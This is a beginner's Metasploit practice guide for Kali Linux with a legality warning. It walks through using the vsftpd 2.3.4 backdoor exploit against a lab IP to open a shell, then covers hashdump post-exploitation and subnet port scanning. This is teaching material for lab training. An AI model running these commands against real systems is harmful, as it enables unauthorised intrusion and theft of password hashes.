# 💣 Metasploit Practice Guide for Cybersecurity Analysts (Kali Linux)

> **⚠️ WARNING!!!**
> This guide is strictly for **educational and ethical hacking purposes**. Never attempt to exploit systems or networks without **explicit written permission**. Unauthorized access is **illegal** and may lead to **criminal charges**. Use only on your **own lab** or authorized testing environments (e.g., Metasploitable2, TryHackMe, Hack The Box).

---

## 🛠️ Prerequisites

- ✅ Kali Linux (with Metasploit pre-installed)
- ✅ Basic Linux terminal knowledge
- ✅ A vulnerable machine to practice on (e.g., Metasploitable2)
- ✅ VirtualBox or VMware for lab setup

---

## 🧪 Step-by-Step Metasploit Practice Guide

---

### 🔹 Step 1: Update Kali & Metasploit

```bash
sudo apt update && sudo apt upgrade -y
sudo msfupdate
````

---

### 🔹 Step 2: Launch Metasploit Console

```bash
msfconsole
```

Wait for the banner and console prompt:

```bash
msf6 >
```

---

### 🔹 Step 3: Search for a Module

```bash
search vsftpd
```

Example output:

```
exploit/unix/ftp/vsftpd_234_backdoor
```

---

### 🔹 Step 4: Select an Exploit Module

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

---

### 🔹 Step 5: Show Options

```bash
show options
```

You'll see required fields like:

* RHOSTS (Target IP)
* RPORT (Target Port)

---

### 🔹 Step 6: Set Target Options

```bash
set RHOSTS 192.168.1.100
set RPORT 21
```

(Replace with your lab IP)

---

### 🔹 Step 7: Set Payload (if needed)

```bash
set PAYLOAD cmd/unix/interact
```

Or just run:

```bash
exploit
```

---

### 🔹 Step 8: Gain a Shell

If successful, you’ll get a shell or session like:

```bash
[*] Command shell session 1 opened...
```

Use commands like:

```bash
whoami
uname -a
```

---

### 🔹 Step 9: Interact with a Session

```bash
sessions
sessions -i 1
```

---

### 🔹 Step 10: Post-Exploitation

```bash
sysinfo
getuid
hashdump
```

Explore available **post modules**:

```bash
search type:post
```

---

### 🔹 Step 11: Use Auxiliary Scanners

Example: Port scanning

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
run
```

Or SMB version scanning:

```bash
use auxiliary/scanner/smb/smb_version
```

---

### 🔹 Step 12: Practice Exploiting Known Vulnerabilities

Good beginner targets:

* **Metasploitable2**
* **DVWA** (Damn Vulnerable Web App)
* **bWAPP**
* **TryHackMe Rooms**
* **Hack The Box retired machines**

---

## 📁 Pro Tips

* Use `tab` to autocomplete modules or commands.
* Use `info` after `use` to learn more about a module.
* Save sessions or logs with:

```bash
spool metasploit_output.txt
```

---

## ✅ Final Notes

* Practice consistently with **safe environments**.
* Document what you exploit, how, and what the outcomes were.
* Combine with other tools like **Nmap**, **John**, and **Burp Suite** for better context.
